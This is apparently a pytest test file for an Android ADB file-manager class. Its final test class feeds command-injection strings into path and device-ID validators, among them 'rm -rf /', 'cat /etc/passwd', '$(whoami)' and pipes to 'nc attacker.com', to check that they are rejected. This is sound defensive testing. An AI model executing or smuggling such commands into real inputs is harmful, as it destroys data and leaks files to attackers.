"""Tests for the main ADB manager module."""

import pytest
import unittest.mock as mock
import os
from unittest.mock import patch, MagicMock

from src.core.adb_manager import ADBManager


class TestADBManager:
    """Test main ADB manager functionality."""
    
    @patch('src.core.adb_manager.get_adb_binary_path')
    def test_init_success(self, mock_get_path):
        """Test ADBManager initialization with successful ADB path."""
        mock_get_path.return_value = '/path/to/adb'
        
        manager = ADBManager()
        
        assert manager.adb_path == '/path/to/adb'
        assert manager.selected_device is None
        assert manager.progress_callback is None
        assert manager.status_callback is None
        assert manager.transfer_progress['current_file'] == 0
    
    @patch('src.core.adb_manager.get_adb_binary_path')
    def test_init_adb_path_failure(self, mock_get_path):
        """Test ADBManager initialization when ADB path fails."""
        mock_get_path.side_effect = Exception("ADB not found")
        
        manager = ADBManager()
        
        assert manager.adb_path is None
    
    @patch('src.core.adb_manager.is_adb_available')
    def test_is_available_true(self, mock_is_available):
        """Test ADB availability check returns True."""
        mock_is_available.return_value = True
        
        manager = ADBManager()
        assert manager.is_available() is True
    
    @patch('src.core.adb_manager.is_adb_available')
    def test_is_available_false(self, mock_is_available):
        """Test ADB availability check returns False."""
        mock_is_available.return_value = False
        
        manager = ADBManager()
        assert manager.is_available() is False
    
    @patch('src.core.adb_manager.is_adb_available')
    @patch('src.core.adb_manager.ensure_platform_tools_in_user_dir')
    @patch('os.path.exists')
    def test_ensure_adb_installed_already_available(self, mock_exists, mock_ensure, mock_is_available):
        """Test ensure_adb_installed when ADB is already available."""
        mock_is_available.return_value = True
        
        manager = ADBManager()
        result = manager.ensure_adb_installed()
        
        assert result is True
        mock_ensure.assert_not_called()
    
    @patch('src.core.adb_manager.is_adb_available')
    @patch('src.core.adb_manager.ensure_platform_tools_in_user_dir')
    @patch('os.path.exists')
    def test_ensure_adb_installed_download_success(self, mock_exists, mock_ensure, mock_is_available):
        """Test ensure_adb_installed with successful download."""
        mock_is_available.return_value = False
        mock_ensure.return_value = '/user/data/adb'
        mock_exists.return_value = True
        
        manager = ADBManager()
        result = manager.ensure_adb_installed()
        
        assert result is True
        assert manager.adb_path == '/user/data/adb'
    
    @patch('src.core.adb_manager.is_adb_available')
    @patch('src.core.adb_manager.ensure_platform_tools_in_user_dir')
    def test_ensure_adb_installed_download_failure(self, mock_ensure, mock_is_available):
        """Test ensure_adb_installed with download failure."""
        mock_is_available.return_value = False
        mock_ensure.side_effect = Exception("Download failed")
        
        manager = ADBManager()
        result = manager.ensure_adb_installed()
        
        assert result is False
    
    def test_get_devices_success(self):
        """Test successful device enumeration."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("List of devices attached\ndevice1\tdevice\ndevice2\tdevice", "", 0)
        )
        
        devices = manager.get_devices()
        
        assert devices == ["device1", "device2"]
    
    def test_get_devices_failure(self):
        """Test device enumeration failure."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "Error", 1)
        )
        
        devices = manager.get_devices()
        
        assert devices == []
    
    def test_get_devices_no_devices(self):
        """Test device enumeration with no connected devices."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("List of devices attached\n", "", 0)
        )
        
        devices = manager.get_devices()
        
        assert devices == []
    
    @patch.object(ADBManager, 'get_devices')
    def test_is_device_connected_specific_device(self, mock_get_devices):
        """Test checking if specific device is connected."""
        mock_get_devices.return_value = ["device1", "device2"]
        
        manager = ADBManager()
        
        assert manager.is_device_connected("device1") is True
        assert manager.is_device_connected("device3") is False
    
    @patch.object(ADBManager, 'get_devices')
    def test_is_device_connected_any_device(self, mock_get_devices):
        """Test checking if any device is connected."""
        mock_get_devices.return_value = ["device1"]
        
        manager = ADBManager()
        
        assert manager.is_device_connected() is True
        
        mock_get_devices.return_value = []
        assert manager.is_device_connected() is False
    
    def test_select_device(self):
        """Test device selection."""
        manager = ADBManager()
        manager.select_device("test_device")
        
        assert manager.selected_device == "test_device"
    
    def test_get_selected_device(self):
        """Test getting selected device."""
        manager = ADBManager()
        manager.selected_device = "test_device"
        
        assert manager.get_selected_device() == "test_device"
    
    def test_get_selected_device_none(self):
        """Test getting selected device when none selected."""
        manager = ADBManager()
        
        assert manager.get_selected_device() is None
    
    def test_list_files_success(self):
        """Test successful file listing."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=(
                "total 12\n"
                "drwxrwxr-x 2 user user 4096 Jan  1 12:00 Documents\n"
                "-rw-rw-r-- 1 user user  100 Jan  1 12:00 test.txt",
                "", 0
            )
        )
        
        files = manager.list_files("/sdcard")
        
        assert len(files) == 2
        assert files[0]['name'] == 'Documents'
        assert files[0]['type'] == 'folder'
        assert files[1]['name'] == 'test.txt'
        assert files[1]['type'] == 'file'
        assert files[1]['size'] == 100
    
    def test_list_files_failure(self):
        """Test file listing failure."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "Permission denied", 1)
        )
        
        files = manager.list_files("/root")
        
        assert files == []
    
    @patch('os.makedirs')
    def test_pull_file_success(self, mock_makedirs):
        """Test successful file pull."""
        manager = ADBManager()
        manager.file_transfer.pull_file = MagicMock(return_value=True)
        
        success, message = manager.pull_file("/sdcard/test.txt", "/local/test.txt")
        
        assert success is True
        assert "successfully" in message
        mock_makedirs.assert_called_once_with("/local", exist_ok=True)
    
    def test_pull_file_failure(self):
        """Test file pull failure."""
        manager = ADBManager()
        manager.file_transfer.pull_file = MagicMock(return_value=False)
        
        success, message = manager.pull_file("/sdcard/test.txt", "/local/test.txt")
        
        assert success is False
        assert "Failed" in message
    
    @patch('os.makedirs')
    def test_pull_folder_success(self, mock_makedirs):
        """Test successful folder pull."""
        manager = ADBManager()
        manager.file_transfer.pull_folder = MagicMock(return_value=True)
        
        success, message = manager.pull_folder("/sdcard/Documents", "/local/Documents")
        
        assert success is True
        assert "successfully" in message
        mock_makedirs.assert_called_once_with("/local/Documents", exist_ok=True)
    
    def test_pull_folder_failure(self):
        """Test folder pull failure."""
        manager = ADBManager()
        manager.file_transfer.pull_folder = MagicMock(return_value=False)
        
        success, message = manager.pull_folder("/sdcard/Documents", "/local/Documents")
        
        assert success is False
        assert "Failed" in message
    
    @patch('os.path.exists')
    def test_push_file_success(self, mock_exists):
        """Test successful file push."""
        mock_exists.return_value = True
        manager = ADBManager()
        manager.file_transfer.push_file = MagicMock(return_value=True)
        
        success, message = manager.push_file("/local/test.txt", "/sdcard/test.txt")
        
        assert success is True
        assert "successfully" in message
    
    @patch('os.path.exists')
    def test_push_file_not_found(self, mock_exists):
        """Test file push when local file doesn't exist."""
        mock_exists.return_value = False
        manager = ADBManager()
        
        success, message = manager.push_file("/local/test.txt", "/sdcard/test.txt")
        
        assert success is False
        assert "not found" in message
    
    @patch('os.path.exists')
    def test_push_file_failure(self, mock_exists):
        """Test file push failure."""
        mock_exists.return_value = True
        manager = ADBManager()
        manager.file_transfer.push_file = MagicMock(return_value=False)
        
        success, message = manager.push_file("/local/test.txt", "/sdcard/test.txt")
        
        assert success is False
        assert "Failed" in message
    
    @patch('os.path.exists')
    def test_push_folder_success(self, mock_exists):
        """Test successful folder push."""
        mock_exists.return_value = True
        manager = ADBManager()
        manager.file_transfer.push_folder = MagicMock(return_value=True)
        
        success, message = manager.push_folder("/local/Documents", "/sdcard/Documents")
        
        assert success is True
        assert "successfully" in message
    
    def test_delete_file_success(self):
        """Test successful file deletion."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "", 0)
        )
        
        success, message = manager.delete_file("/sdcard/test.txt")
        
        assert success is True
        assert "deleted" in message
    
    def test_delete_file_failure(self):
        """Test file deletion failure."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "Permission denied", 1)
        )
        
        success, message = manager.delete_file("/sdcard/test.txt")
        
        assert success is False
        assert "Failed" in message
    
    def test_create_folder_success(self):
        """Test successful folder creation."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "", 0)
        )
        
        success, message = manager.create_folder("/sdcard/NewFolder")
        
        assert success is True
        assert "created" in message
    
    def test_delete_folder_success(self):
        """Test successful folder deletion."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "", 0)
        )
        
        success, message = manager.delete_folder("/sdcard/OldFolder")
        
        assert success is True
        assert "deleted" in message
    
    def test_move_item_success(self):
        """Test successful item move/rename."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "", 0)
        )
        
        success, message = manager.move_item("/sdcard/old.txt", "/sdcard/new.txt")
        
        assert success is True
        assert "moved" in message
    
    def test_get_file_info_success(self):
        """Test successful file info retrieval."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=(
                "-rw-rw-r-- 1 user user 1024 Jan  1 12:00 test.txt",
                "", 0
            )
        )
        
        info = manager.get_file_info("/sdcard/test.txt")
        
        assert info is not None
        assert info['name'] == 'test.txt'
        assert info['type'] == 'file'
        assert info['size'] == 1024
    
    def test_get_file_info_failure(self):
        """Test file info retrieval failure."""
        manager = ADBManager()
        manager.command_runner.run_adb_command = MagicMock(
            return_value=("", "File not found", 1)
        )
        
        info = manager.get_file_info("/sdcard/nonexistent.txt")
        
        assert info is None
    
    @patch('src.core.adb_manager.FileDeduplicator')
    def test_deduplicate_files_success(self, mock_deduplicator_class):
        """Test successful file deduplication."""
        mock_deduplicator = MagicMock()
        mock_deduplicator.find_duplicates.return_value = [['file1.txt', 'file2.txt']]
        mock_deduplicator.remove_duplicates.return_value = 1
        mock_deduplicator_class.return_value = mock_deduplicator
        
        manager = ADBManager()
        removed_count, duplicates = manager.deduplicate_files("/test/folder")
        
        assert removed_count == 1
        assert len(duplicates) == 1
    
    @patch('src.core.adb_manager.FileDeduplicator')
    def test_deduplicate_files_no_duplicates(self, mock_deduplicator_class):
        """Test file deduplication with no duplicates found."""
        mock_deduplicator = MagicMock()
        mock_deduplicator.find_duplicates.return_value = []
        mock_deduplicator_class.return_value = mock_deduplicator
        
        manager = ADBManager()
        removed_count, duplicates = manager.deduplicate_files("/test/folder")
        
        assert removed_count == 0
        assert duplicates == []


class TestADBManagerSecurityIntegration:
    """Integration tests for security validation in ADB manager methods."""

    def test_list_files_rejects_command_injection(self):
        """Test that list_files() rejects paths with command injection attempts."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        malicious_paths = [
            "/sdcard/test; rm -rf /",
            "/sdcard/$(whoami)",
            "/sdcard/`malicious`",
            "/sdcard/test && cat /etc/passwd",
            "/sdcard/test | nc attacker.com 1234",
        ]

        for path in malicious_paths:
            result = manager.list_files(path)
            assert result == [], f"Failed to reject malicious path: {path}"

    def test_delete_file_rejects_path_traversal(self):
        """Test that delete_file() rejects path traversal attempts."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        malicious_paths = [
            "/sdcard/test\x00.txt",
            "/sdcard/file; rm -rf /",
        ]

        for path in malicious_paths:
            success, message = manager.delete_file(path)
            assert not success, f"Failed to reject malicious path: {path}"
            assert "Invalid path" in message, f"Expected security error message for: {path}"

    def test_create_folder_rejects_malicious_input(self):
        """Test that create_folder() rejects malicious path inputs."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        malicious_paths = [
            "/sdcard/test && malicious",
            "/sdcard/$(whoami)",
            "/sdcard/test\nmalicious_command",
        ]

        for path in malicious_paths:
            success, message = manager.create_folder(path)
            assert not success, f"Failed to reject malicious path: {path}"
            assert "Invalid path" in message

    def test_move_item_rejects_both_malicious_paths(self):
        """Test that move_item() rejects malicious source or destination paths."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        # Malicious source
        success, message = manager.move_item("/sdcard/test; rm -rf /", "/sdcard/dest")
        assert not success
        assert "Invalid path" in message

        # Malicious destination
        success, message = manager.move_item("/sdcard/source", "/sdcard/dest && malicious")
        assert not success
        assert "Invalid path" in message

    def test_operations_reject_malicious_device_ids(self):
        """Test that operations reject malicious device IDs."""
        manager = ADBManager()

        malicious_device_ids = [
            "device123; malicious",
            "device && cat /etc/passwd",
            "device|nc attacker.com",
            "device\nmalicious",
        ]

        for device_id in malicious_device_ids:
            # Test with list_files
            result = manager.list_files("/sdcard/test", device_id=device_id)
            assert result == [], f"Failed to reject malicious device ID: {device_id}"

            # Test with get_file_info
            result = manager.get_file_info("/sdcard/test", device_id=device_id)
            assert result is None, f"Failed to reject malicious device ID: {device_id}"

    def test_delete_folder_rejects_dangerous_patterns(self):
        """Test that delete_folder() rejects dangerous path patterns."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        dangerous_paths = [
            "/sdcard/test||malicious",
            "/sdcard/test&&malicious",
            "/sdcard/test>>output.txt",
        ]

        for path in dangerous_paths:
            success, message = manager.delete_folder(path)
            assert not success, f"Failed to reject dangerous path: {path}"
            assert "Invalid path" in message

    def test_get_file_info_with_null_bytes(self):
        """Test that get_file_info() rejects null bytes in paths."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        result = manager.get_file_info("/sdcard/file\x00.txt")
        assert result is None

    @patch('src.core.adb_manager.ADBCommandRunner')
    def test_sanitized_paths_passed_to_adb_commands(self, mock_runner_class):
        """Test that sanitized paths are passed to ADB commands, not original inputs."""
        mock_runner = MagicMock()
        mock_runner.run_adb_command.return_value = ("", "", 0)
        mock_runner_class.return_value = mock_runner

        manager = ADBManager()
        manager.selected_device = "test_device"

        # Valid path should be passed through
        manager.list_files("/sdcard/DCIM")

        # Verify the command was called with the sanitized path
        args_list = mock_runner.run_adb_command.call_args[0][0]
        assert "/sdcard/DCIM" in args_list

        # Malicious path should not reach the command runner
        mock_runner.run_adb_command.reset_mock()
        manager.list_files("/sdcard/test; rm -rf /")

        # Command runner should not be called for invalid paths
        mock_runner.run_adb_command.assert_not_called()

    def test_unicode_paths_accepted(self):
        """Test that valid Unicode paths are accepted."""
        manager = ADBManager()
        manager.selected_device = "test_device"

        unicode_paths = [
            "/sdcard/照片/vacation.jpg",
            "/sdcard/Фото/image.png",
            "/sdcard/My Photos/vacation.jpg",
        ]

        for path in unicode_paths:
            # Should not raise exception or return security error
            result = manager.list_files(path)
            # Result will be empty list due to mocked command, but should not reject path
            assert isinstance(result, list)